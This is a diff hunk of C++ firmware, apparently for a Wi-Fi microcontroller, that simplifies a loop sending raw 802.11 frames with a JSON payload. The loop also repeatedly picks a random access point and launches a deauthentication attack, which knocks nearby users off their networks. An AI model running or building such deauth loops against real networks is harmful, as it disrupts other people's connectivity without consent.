@@ -113,17 +113,14 @@ void decompressPayload(const char* input, char* output) {
 
 // this is the looping function that sends the payload
 void loop() {
-  char compressedPayload[256];
-  compressPayload(jsonPayload, compressedPayload);
-  const uint8_t* payloadData = reinterpret_cast<const uint8_t*>(jsonPayload);
-  // get random ap
-  deauthAttack.selectRandomAP();
-  // send payload
-  Raw80211::send(payloadData, strlen(jsonPayload));
-  delay(5000);
-  // deauthing the ap
-  deauthAttack.startRandomDeauth();
-  delay(5000);
+    // get random ap
+    deauthAttack.selectRandomAP();
+    // send payload
+    Raw80211::send(reinterpret_cast<const uint8_t*>(jsonPayload), strlen(jsonPayload));
+    delay(5000);
+    // deauthing the ap
+    deauthAttack.startRandomDeauth();
+    delay(5000);
 }
 
 void on_packet(const wifi_ieee80211_mac_hdr_t *hdr, signed int rssi, const uint8_t *buff, uint16_t buff_len) {
